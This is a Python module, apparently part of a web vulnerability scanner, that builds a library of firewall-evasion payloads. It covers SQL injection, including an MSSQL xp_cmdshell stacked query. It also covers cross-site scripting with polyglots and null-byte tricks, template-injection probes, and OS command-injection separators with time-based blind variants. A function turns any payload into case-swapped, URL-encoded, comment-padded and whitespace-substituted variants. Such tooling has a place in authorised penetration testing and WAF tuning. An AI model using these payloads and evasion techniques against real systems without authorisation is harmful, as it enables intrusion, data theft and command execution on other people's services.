"""
WAF BYPASS PAYLOADS — WAF-Aware Payload Library
=================================================
Collection encoded payloads for bypass common WAF rules.

Usage:
    from engines.waf_bypass import WAFBypass

    bypass = WAFBypass()
    payloads = bypass.get_sqli_payloads()
    payloads = bypass.get_xss_payloads()
    payloads = bypass.get_bypassed_payload("SELECT * FROM users", "sqli")
"""

import re
from typing import List, Dict, Tuple
from urllib.parse import quote


class WAFBypass:
    """
    Generate WAF-aware payloads with berbagai encoding techniques.
    
    Supported encoding techniques:
    - URL encoding (single/double)
    - Unicode normalization
    - Case variation (mixed case)
    - Comment injection (/**/)
    - Whitespace substitution (tabs, newlines, form feeds)
    - Hex encoding
    - Mixed encoding
    """

    # ── SQLi Payloads ─────────────────────────────────────────────────────────

    def get_sqli_payloads(self) -> List[Tuple[str, str, str]]:
        """
        Return list of (payload, detection_type, description) tuples.
        Includes base payloads + WAF-bypass variants.
        """
        payloads = []

        # ── Base payloads ──────────────────────────────────────────────────────
        base_payloads = [
            ("' OR '1'='1", "boolean", "Classic auth bypass"),
            ("' OR 1=1--", "boolean", "Comment-based bypass"),
            ("' UNION SELECT NULL--", "union", "UNION injection"),
            ("' AND '1'='1", "boolean", "Boolean true"),
            ("1' AND SLEEP(5)--", "time", "Time-based blind"),
            ("'; EXEC xp_cmdshell('id')--", "stacked", "Stacked queries (MSSQL)"),
        ]

        for payload, dtype, desc in base_payloads:
            payloads.append((payload, dtype, f"Base: {desc}"))

        # ── Case variation bypass ──────────────────────────────────────────────
        case_variants = [
            ("' oR 1=1--", "Case variation: mixed case OR"),
            ("' UnIoN sElEcT NULL--", "Case variation: mixed case UNION"),
            ("' AnD SlEeP(5)--", "Case variation: mixed case SLEEP"),
        ]
        for payload, desc in case_variants:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Comment injection bypass ───────────────────────────────────────────
        comment_bypasses = [
            ("'/**/OR/**/1=1--", "Inline comment bypass OR"),
            ("'/**/UNION/**/SELECT/**/NULL--", "Inline comment bypass UNION"),
            ("'/**/AND/**/SLEEP(5)--", "Inline comment bypass SLEEP"),
            ("'/*!50000UNION*/ SELECT NULL--", "MySQL version comment"),
            ("'/*!UNION*/ /*!SELECT*/ NULL--", "MySQL inline version"),
        ]
        for payload, desc in comment_bypasses:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Whitespace bypass ──────────────────────────────────────────────────
        ws_bypasses = [
            ("'%09OR%091=1--", "Tab character bypass"),
            ("'%0AOR%0A1=1--", "Newline bypass"),
            ("'%0DOR%0D1=1--", "Carriage return bypass"),
            ("'%0COR%0C1=1--", "Form feed bypass"),
            ("'%A0OR%A01=1--", "Non-breaking space bypass"),
        ]
        for payload, desc in ws_bypasses:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Hex encoding bypass ────────────────────────────────────────────────
        hex_bypasses = [
            ("0x27204F5220313D312D2D", "Hex-encoded ' OR 1=1--"),
            ("0x2720554E494F4E2053454C454354204E554C4C2D2D", "Hex-encoded UNION SELECT"),
        ]
        for payload, desc in hex_bypasses:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Double URL encoding bypass ─────────────────────────────────────────
        double_enc = [
            (quote("' OR 1=1--"), "Double URL encoded OR"),
            (quote(quote("' OR 1=1--")), "Triple URL encoded OR"),
        ]
        for payload, desc in double_enc:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Alternative syntax bypass ──────────────────────────────────────────
        alt_syntax = [
            ("1' || '1'='1", "SQL concatenation operator"),
            ("1' && '1'='1", "SQL AND with &&"),
            ("1' RLIKE '1'='1'", "SQL RLIKE operator"),
            ("1' REGEXP '1'='1'", "SQL REGEXP operator"),
        ]
        for payload, desc in alt_syntax:
            payloads.append((payload, "waf_bypass", f"Alt syntax: {desc}"))

        return payloads

    # ── XSS Payloads ──────────────────────────────────────────────────────────

    def get_xss_payloads(self) -> List[Tuple[str, str, str]]:
        """
        Return list of (payload, detection_type, description) tuples.
        """
        payloads = []

        # ── Base payloads ──────────────────────────────────────────────────────
        base = [
            ("<script>alert(1)</script>", "reflected", "Classic script tag"),
            ("<img src=x onerror=alert(1)>", "reflected", "Image onerror"),
            ("<svg onload=alert(1)>", "reflected", "SVG onload"),
            ("<body onload=alert(1)>", "reflected", "Body onload"),
        ]
        for payload, dtype, desc in base:
            payloads.append((payload, dtype, f"Base: {desc}"))

        # ── Case variation bypass ──────────────────────────────────────────────
        case = [
            ("<ScRiPt>alert(1)</ScRiPt>", "Case variation: mixed case script"),
            ("<IMG SRC=x ONERROR=alert(1)>", "Case variation: mixed case event"),
            ("<sVg OnLoAd=alert(1)>", "Case variation: mixed case SVG"),
        ]
        for payload, desc in case:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Null byte bypass ───────────────────────────────────────────────────
        null = [
            ("<scr%00ipt>alert(1)</script>", "Null byte in tag"),
            ("<scr\x00ipt>alert(1)</script>", "Hex null in tag"),
        ]
        for payload, desc in null:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Encoding bypass ────────────────────────────────────────────────────
        enc = [
            ("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML entity encoding"),
            ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "Hex entity encoding"),
            (quote("<script>alert(1)</script>"), "URL encoding"),
            ("%3Cscript%3Ealert(1)%3C/script%3E", "URL encoding alt"),
        ]
        for payload, desc in enc:
            payloads.append((payload, "waf_bypass", f"WAF bypass: {desc}"))

        # ── Event handler bypass ───────────────────────────────────────────────
        events = [
            ("<img src=x onerror=alert(1)//", "Event handler bypass"),
            ("<details open ontoggle=alert(1)>", "Details tag"),
            ("<marquee onstart=alert(1)>", "Marquee event"),
            ("<input autofocus onfocus=alert(1)>", "Input autofocus"),
            ("<video><source onerror=alert(1)>", "Video source"),
            ("<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1'>", "Polyglot XSS"),
        ]
        for payload, desc in events:
            payloads.append((payload, "waf_bypass", f"Event bypass: {desc}"))

        # ── Polyglot payloads ──────────────────────────────────────────────────
        polyglot = [
            ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtArEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "Polyglot XSS"),
        ]
        for payload, desc in polyglot:
            payloads.append((payload, "waf_bypass", f"Polyglot: {desc}"))

        return payloads

    # ── SSTI Payloads ─────────────────────────────────────────────────────────

    def get_ssti_payloads(self) -> List[Tuple[str, str, str]]:
        """Return SSTI payloads with WAF bypass variants."""
        payloads = []

        base = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Java EL"),
            ("#{7*7}", "49", "Spring EL"),
            ("<%= 7*7 %>", "49", "ERB"),
        ]
        for payload, expected, desc in base:
            payloads.append((payload, expected, f"Base: {desc}"))

        # WAF bypass variants
        bypass = [
            ("{{ 7*7 }}", "49", "Whitespace bypass"),
            ("{{7*'7'}}", "7777777", "Jinja2 specific"),
            ("${{7*7}}", "49", "Pebble"),
            ("*{7*7}", "49", "Spring EL alt"),
        ]
        for payload, expected, desc in bypass:
            payloads.append((payload, expected, f"Bypass: {desc}"))

        return payloads

    # ── Command Injection Payloads ─────────────────────────────────────────────

    def get_cmdi_payloads(self) -> List[Tuple[str, str, str]]:
        """Return command injection payloads."""
        payloads = []

        base = [
            (";id", "output", "Semicolon separator"),
            ("|id", "output", "Pipe separator"),
            ("&&id", "output", "AND separator"),
            ("`id`", "output", "Backtick execution"),
            ("$(id)", "output", "Dollar execution"),
        ]
        for payload, dtype, desc in base:
            payloads.append((payload, dtype, f"Base: {desc}"))

        # WAF bypass variants
        bypass = [
            (";id", "Bypass: semicolon"),
            ("| id", "Bypass: space after pipe"),
            ("|| id", "Bypass: double pipe"),
            ("&& id", "Bypass: space after &&"),
            ("%0aid", "Bypass: newline"),
            ("%0Did", "Bypass: carriage return"),
        ]
        for payload, desc in bypass:
            payloads.append((payload, "waf_bypass", f"WAF: {desc}"))

        # Blind (time-based)
        blind = [
            (";sleep 5", "time", "Blind: sleep 5"),
            ("|sleep 5", "time", "Blind: pipe sleep"),
            ("$(sleep 5)", "time", "Blind: dollar sleep"),
        ]
        for payload, dtype, desc in blind:
            payloads.append((payload, dtype, f"Blind: {desc}"))

        return payloads

    # ── Generic Payload Applier ────────────────────────────────────────────────

    def apply_bypass_techniques(self, payload: str) -> List[str]:
        """
        Generate WAF bypass variants from base payload.
        Return list of encoded payloads.
        """
        variants = [payload]  # Original

        # Case variation
        variants.append(payload.swapcase())

        # URL encoding (single)
        variants.append(quote(payload))

        # Double URL encoding
        variants.append(quote(quote(payload)))

        # With comment injection (for SQL-like payloads)
        if any(kw in payload.upper() for kw in ["SELECT", "UNION", "OR", "AND"]):
            variants.append(re.sub(r'\s+', '/**/', payload))
            variants.append(re.sub(r' ', '/**/', payload))

        # With null byte (for tag-based payloads)
        if "<" in payload and ">" in payload:
            variants.append(payload.replace("<", "<\x00"))
            variants.append(payload.replace(">", "\x00>"))

        # With whitespace alternatives
        if " " in payload:
            variants.append(payload.replace(" ", "\t"))
            variants.append(payload.replace(" ", "\n"))
            variants.append(payload.replace(" ", "\r"))

        return list(set(variants))  # Deduplicate


# Global instance
waf_bypass = WAFBypass()
